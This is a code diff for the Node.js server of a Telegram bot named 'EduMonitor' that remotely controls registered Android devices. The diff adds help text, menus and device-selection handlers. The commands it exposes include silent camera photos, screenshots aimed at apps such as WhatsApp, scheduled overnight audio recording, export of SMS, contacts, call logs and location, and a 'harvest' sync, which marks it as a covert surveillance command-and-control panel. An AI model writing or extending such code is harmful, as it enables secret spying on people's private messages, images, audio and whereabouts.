@@ -1012,7 +1012,89 @@ app.post('/webhook', async (req, res) => {
 async function handleCommand(chatId, command, messageId) {
     console.log(`🎯 Command: ${command} from ${chatId}`);
     
-    // Handle /stats command
+    // ============ SERVER-SIDE COMMANDS (NOT sent to device) ============
+    
+    // Handle /start - Welcome message with instructions
+    if (command === '/start') {
+        console.log('🎉 Welcome message for /start');
+        
+        const welcomeMessage = `🤖 *Welcome to EduMonitor Bot!*\n\n` +
+            `This bot helps you monitor and control your Android devices remotely.\n\n` +
+            `📱 *Getting Started:*\n` +
+            `1. Download and install the EduMonitor app on your Android device\n` +
+            `2. Open the app and grant all required permissions\n` +
+            `3. The device will automatically register with this bot\n` +
+            `4. Once registered, use the menu below to control your device\n\n` +
+            `🔧 *Quick Commands:*\n` +
+            `• /help - Show this menu\n` +
+            `• /devices - List your registered devices\n` +
+            `• /stats - View device statistics\n` +
+            `• /select [id] - Select active device\n\n` +
+            `💡 *Tips:*\n` +
+            `• You can control multiple devices from one chat\n` +
+            `• Use the inline buttons for easy navigation\n` +
+            `• Commands are queued when device is offline\n\n` +
+            `Click the buttons below to get started!`;
+        
+        await sendTelegramMessageWithKeyboard(
+            chatId,
+            welcomeMessage,
+            getMainMenuKeyboard(chatId)
+        );
+        return;
+    }
+    
+    // Handle /help - Show help menu
+    if (command === '/help') {
+        console.log('📋 Showing help menu');
+        
+        const helpMessage = `🤖 *EduMonitor Bot Help*\n\n` +
+            `*📱 Device Management*\n` +
+            `• /devices - List all registered devices\n` +
+            `• /stats - Show device statistics\n` +
+            `• /select [device_id] - Select active device\n\n` +
+            `*📸 Screenshot*\n` +
+            `• /screenshot - Take screenshot\n` +
+            `• /start_screenshot - Start auto-screenshot\n` +
+            `• /stop_screenshot - Stop auto-screenshot\n\n` +
+            `*📷 Camera*\n` +
+            `• /photo - Take photo (with notification)\n` +
+            `• /photo_silent - Take photo (silent)\n` +
+            `• /photo_front - Front camera photo\n\n` +
+            `*🎤 Recording*\n` +
+            `• /record - Start 60s recording\n` +
+            `• /stop_recording - Stop recording\n\n` +
+            `*📊 Data*\n` +
+            `• /contacts - Export contacts\n` +
+            `• /sms - Export SMS\n` +
+            `• /calllogs - Export call logs\n` +
+            `• /location - Get device location\n\n` +
+            `*ℹ️ Info*\n` +
+            `• /device_info - Device information\n` +
+            `• /network_info - Network information\n` +
+            `• /mobile_info - Mobile/SIM information\n\n` +
+            `Use the menu buttons below for quick access!`;
+        
+        await sendTelegramMessageWithKeyboard(
+            chatId,
+            helpMessage,
+            getMainMenuKeyboard(chatId)
+        );
+        return;
+    }
+    
+    // Handle /showmenu - Show main menu
+    if (command === '/showmenu') {
+        console.log('📋 Showing main menu');
+        await sendTelegramMessageWithKeyboard(
+            chatId,
+            "🤖 *EduMonitor Control Panel*\n\nSelect a category:",
+            getMainMenuKeyboard(chatId)
+        );
+        return;
+    }
+    
+    // Handle /stats - Show device statistics
     if (command === '/stats' || command === '/device_stats') {
         const stats = await getDeviceStats(chatId);
         const message = formatDeviceStatsMessage(stats);
@@ -1020,13 +1102,15 @@ async function handleCommand(chatId, command, messageId) {
         return;
     }
     
-    // Handle /devices command
+    // Handle /devices - List all devices
     if (command === '/devices') {
         const userDevices = getDeviceListForUser(chatId);
         let message = `📱 *Your Devices*\n\n`;
         
         if (userDevices.length === 0) {
-            message += "No devices registered yet.";
+            message += "No devices registered yet.\n\n";
+            message += "Please install the Android app and grant permissions.\n";
+            message += "The device will automatically register when you open the app.";
         } else {
             userDevices.forEach((device, index) => {
                 const status = device.isActive ? '✅ ACTIVE' : '○';
@@ -1048,13 +1132,32 @@ async function handleCommand(chatId, command, messageId) {
         return;
     }
     
-    // Handle /refresh command
+    // Handle /select - Select active device
+    if (command.startsWith('/select ')) {
+        const deviceId = command.substring(8).trim();
+        const device = devices.get(deviceId);
+        
+        if (device && String(device.chatId) === String(chatId)) {
+            userDeviceSelection.set(chatId, deviceId);
+            await sendTelegramMessage(chatId, 
+                `✅ Now controlling: ${device.deviceInfo?.model || 'Device'}\n` +
+                `ID: ${deviceId.substring(0, 8)}...\n\n` +
+                `You can now send commands to this device.`);
+        } else {
+            await sendTelegramMessage(chatId, '❌ Device not found or not authorized.\n\nUse /devices to see available devices.');
+        }
+        return;
+    }
+    
+    // Handle /refresh - Refresh stats
     if (command === '/refresh' || command === '/refresh_stats') {
         const stats = await getDeviceStats(chatId);
         const message = formatDeviceStatsMessage(stats);
         await sendTelegramMessage(chatId, message);
         return;
     }
+    
+    // ============ COMMANDS THAT GO TO DEVICE ============
     
     // Get selected device
     let selectedDeviceId = userDeviceSelection.get(chatId);
@@ -1072,7 +1175,14 @@ async function handleCommand(chatId, command, messageId) {
     }
     
     if (!device) {
-        await sendTelegramMessageWithKeyboard(chatId, '❌ No device registered.', getMainMenuKeyboard(chatId));
+        await sendTelegramMessageWithKeyboard(chatId, 
+            '❌ *No device registered!*\n\n' +
+            'Please make sure:\n' +
+            '1. The Android app is installed\n' +
+            '2. All permissions are granted\n' +
+            '3. The app has been opened at least once\n\n' +
+            'The device will automatically register when you open the app.',
+            getMainMenuKeyboard(chatId));
         return;
     }
     
@@ -1090,9 +1200,8 @@ async function handleCommand(chatId, command, messageId) {
     });
     await saveDevices();
     
-    await sendTelegramMessage(chatId, `✅ Command sent: ${command}\n📱 Device: ${device.deviceInfo?.model || 'Unknown'}`);
+    await sendTelegramMessage(chatId, `✅ *Command sent: ${command}*\n📱 Device: ${device.deviceInfo?.model || 'Unknown'}\n\nThe command will be executed when the device is online.`);
 }
-
 // ============= CALLBACK QUERY HANDLER =============
 async function handleCallbackQuery(callbackQuery) {
     const chatId = callbackQuery.message.chat.id;
@@ -1100,171 +1209,204 @@ async function handleCallbackQuery(callbackQuery) {
     const data = callbackQuery.data;
     const callbackId = callbackQuery.id;
     
+    console.log(`🖱️ Callback: ${data} from ${chatId}`);
+    
     await answerCallbackQuery(callbackId);
     
+    // Handle command callbacks (cmd:something)
     if (data.startsWith('cmd:')) {
         const command = data.substring(4);
+        // These are device commands - send to device
         await handleCommand(chatId, `/${command}`, messageId);
         return;
     }
     
+    // Handle menu navigation
     switch (data) {
         case 'help_main':
             await editMessageKeyboard(chatId, messageId, getMainMenuKeyboard(chatId));
-            await sendTelegramMessage(chatId, "🤖 Control Panel");
+            await sendTelegramMessage(chatId, "🤖 *EduMonitor Control Panel*\n\nSelect a category:");
             break;
+            
         case 'menu_screenshot':
             await editMessageKeyboard(chatId, messageId, getScreenshotMenuKeyboard());
             break;
+            
         case 'menu_screenshot_settings':
             await editMessageKeyboard(chatId, messageId, getScreenshotSettingsKeyboard());
             break;
+            
         case 'menu_screenshot_targets':
             await editMessageKeyboard(chatId, messageId, getScreenshotTargetsKeyboard());
             break;
+            
         case 'menu_screenshot_quality':
             await editMessageKeyboard(chatId, messageId, getScreenshotQualityKeyboard());
             break;
+            
         case 'menu_screenshot_token':
             await editMessageKeyboard(chatId, messageId, getScreenshotTokenKeyboard());
             break;
+            
         case 'menu_sched_config':
             await editMessageKeyboard(chatId, messageId, getSchedConfigKeyboard());
             break;
+            
         case 'menu_configure_schedule':
-            await sendTelegramMessage(chatId, "⚙️ Configure Schedule\nSend: `on/off general_minutes target_minutes`");
+            await sendTelegramMessage(chatId, "⚙️ *Configure Screenshot Schedule*\n\nSend: `on/off general_minutes target_minutes`\nExample: `on 10 5`");
             await editMessageKeyboard(chatId, messageId, getConfigureScheduleKeyboard());
             userStates.set(chatId, { state: 'awaiting_sched_config' });
             break;
+            
         case 'menu_add_target':
-            await sendTelegramMessage(chatId, "📱 Add Target App\nSend package name");
+            await sendTelegramMessage(chatId, "📱 *Add Target App*\n\nSend the package name:\nExample: `com.whatsapp`");
             await editMessageKeyboard(chatId, messageId, getAddTargetKeyboard());
             userStates.set(chatId, { state: 'awaiting_add_target' });
             break;
+            
         case 'menu_remove_target':
-            await sendTelegramMessage(chatId, "❌ Remove Target App\nSend package name");
+            await sendTelegramMessage(chatId, "❌ *Remove Target App*\n\nSend the package name to remove:");
             await editMessageKeyboard(chatId, messageId, getRemoveTargetKeyboard());
             userStates.set(chatId, { state: 'awaiting_remove_target' });
             break;
+            
         case 'menu_camera':
             await editMessageKeyboard(chatId, messageId, getCameraMenuKeyboard());
             break;
+            
         case 'menu_recording':
             await editMessageKeyboard(chatId, messageId, getRecordingMenuKeyboard());
             break;
+            
         case 'menu_recording_settings':
             await editMessageKeyboard(chatId, messageId, getRecordingSettingsKeyboard());
             break;
+            
         case 'menu_audio_quality':
             await editMessageKeyboard(chatId, messageId, getAudioQualityKeyboard());
             break;
+            
         case 'menu_custom_schedule':
-            await sendTelegramMessage(chatId, "⚙️ Custom Schedule\nFormat: `HH:MM HH:MM daily/once minutes`");
+            await sendTelegramMessage(chatId, "⚙️ *Set Custom Recording Schedule*\n\nFormat: `HH:MM HH:MM daily/once minutes`\nExample: `22:00 06:00 daily 30`");
             await editMessageKeyboard(chatId, messageId, getCustomScheduleKeyboard());
             userStates.set(chatId, { state: 'awaiting_custom_schedule' });
             break;
+            
         case 'menu_data':
             await editMessageKeyboard(chatId, messageId, getDataMenuKeyboard());
             break;
+            
         case 'menu_new_data':
             await editMessageKeyboard(chatId, messageId, getNewDataKeyboard());
             break;
+            
         case 'menu_all_data':
             await editMessageKeyboard(chatId, messageId, getAllDataKeyboard());
             break;
+            
         case 'menu_sync_harvest':
             await editMessageKeyboard(chatId, messageId, getSyncHarvestKeyboard());
             break;
+            
         case 'menu_set_sync_interval':
-            await sendTelegramMessage(chatId, "⚙️ Set Sync Interval\nSend minutes (5-720)");
+            await sendTelegramMessage(chatId, "⚙️ *Set Sync Interval*\n\nSend interval in minutes (5-720):\nExample: `60`");
             await editMessageKeyboard(chatId, messageId, getSetSyncIntervalKeyboard());
             userStates.set(chatId, { state: 'awaiting_sync_interval' });
             break;
+            
         case 'menu_realtime':
             await editMessageKeyboard(chatId, messageId, getRealtimeMenuKeyboard());
             break;
+            
         case 'menu_info':
             await editMessageKeyboard(chatId, messageId, getInfoMenuKeyboard());
             break;
+            
         case 'menu_device_name':
             await editMessageKeyboard(chatId, messageId, getDeviceNameKeyboard());
             break;
+            
         case 'menu_system':
             await editMessageKeyboard(chatId, messageId, getSystemMenuKeyboard());
             break;
+            
         case 'menu_media':
             await editMessageKeyboard(chatId, messageId, getMediaMenuKeyboard());
             break;
+            
         case 'menu_add_scan_path':
-            await sendTelegramMessage(chatId, "📁 Add Scan Path\nSend folder path");
+            await sendTelegramMessage(chatId, "📁 *Add Scan Path*\n\nSend the folder path to scan:\nExample: `DCIM/Camera`");
             await editMessageKeyboard(chatId, messageId, getAddScanPathKeyboard());
             userStates.set(chatId, { state: 'awaiting_add_scan_path' });
             break;
+            
         case 'menu_remove_scan_path':
-            await sendTelegramMessage(chatId, "❌ Remove Scan Path\nSend folder path");
+            await sendTelegramMessage(chatId, "❌ *Remove Scan Path*\n\nSend the folder path to remove:");
             await editMessageKeyboard(chatId, messageId, getRemoveScanPathKeyboard());
             userStates.set(chatId, { state: 'awaiting_remove_scan_path' });
             break;
+            
         case 'menu_app_management':
             await editMessageKeyboard(chatId, messageId, getAppManagementKeyboard());
             break;
+            
         case 'menu_data_saving':
             await editMessageKeyboard(chatId, messageId, getDataSavingKeyboard());
             break;
+            
         case 'menu_bot_token':
             await editMessageKeyboard(chatId, messageId, getBotTokenKeyboard());
             break;
+            
         case 'menu_set_server_backup':
-            await sendTelegramMessage(chatId, "🤖 Set Server Backup\nFormat: `token1 chatId1 token2 chatId2`");
+            await sendTelegramMessage(chatId, "🤖 *Set Server Backup Tokens*\n\nFormat: `token1 chatId1 token2 chatId2`\nExample: `123456:ABC 123456789 654321:XYZ 987654321`");
             await editMessageKeyboard(chatId, messageId, getSetServerBackupKeyboard());
             userStates.set(chatId, { state: 'awaiting_server_backup' });
             break;
+            
         case 'menu_devices':
             const keyboard = getDeviceSelectionKeyboard(chatId);
             await editMessageKeyboard(chatId, messageId, keyboard);
             break;
+            
         case 'refresh_devices':
             const refreshKeyboard = getDeviceSelectionKeyboard(chatId);
             await editMessageKeyboard(chatId, messageId, refreshKeyboard);
-            await answerCallbackQuery(callbackId, '🔄 Refreshed');
+            await answerCallbackQuery(callbackId, '🔄 Device list refreshed');
             break;
+            
         case 'device_stats':
             const stats = await getDeviceStats(chatId);
             const message = formatDeviceStatsMessage(stats);
             await sendTelegramMessage(chatId, message);
             break;
+            
+        case 'close_menu':
+            await editMessageKeyboard(chatId, messageId, []);
+            await sendTelegramMessage(chatId, "Menu closed. Type /help to reopen.");
+            break;
+            
         default:
             if (data.startsWith('select_device:')) {
                 const selectedDeviceId = data.split(':')[1];
                 const device = devices.get(selectedDeviceId);
                 if (device) {
                     userDeviceSelection.set(chatId, selectedDeviceId);
-                    await answerCallbackQuery(callbackId, `✅ Now controlling ${device.deviceInfo?.model}`);
+                    await answerCallbackQuery(callbackId, `✅ Now controlling ${device.deviceInfo?.model || 'device'}`);
                     await editMessageKeyboard(chatId, messageId, getMainMenuKeyboard(chatId));
+                    await sendTelegramMessage(chatId, `✅ Now controlling: ${device.deviceInfo?.model || 'Device'}`);
+                } else {
+                    await answerCallbackQuery(callbackId, '❌ Device not found');
                 }
-            } else if (data === 'close_menu') {
-                await editMessageKeyboard(chatId, messageId, []);
-                await sendTelegramMessage(chatId, "Menu closed. Type /help to reopen.");
+            } else {
+                console.log(`⚠️ Unknown callback: ${data}`);
+                await answerCallbackQuery(callbackId, '❌ Unknown option');
             }
             break;
     }
 }
 
-function getDeviceSelectionKeyboard(chatId) {
-    const userDevices = getDeviceListForUser(chatId);
-    const keyboard = [];
-    userDevices.forEach(device => {
-        const status = device.isActive ? '✅ ' : '';
-        keyboard.push([{
-            text: `${status}${device.name}`,
-            callback_data: `select_device:${device.id}`
-        }]);
-    });
-    keyboard.push([{ text: '🔄 Refresh', callback_data: 'refresh_devices' }]);
-    keyboard.push([{ text: '📊 Stats', callback_data: 'device_stats' }]);
-    keyboard.push([{ text: '◀️ Back', callback_data: 'help_main' }]);
-    return keyboard;
-}
+
 
 // ============= COMPLETE INLINE MENU KEYBOARDS =============
 
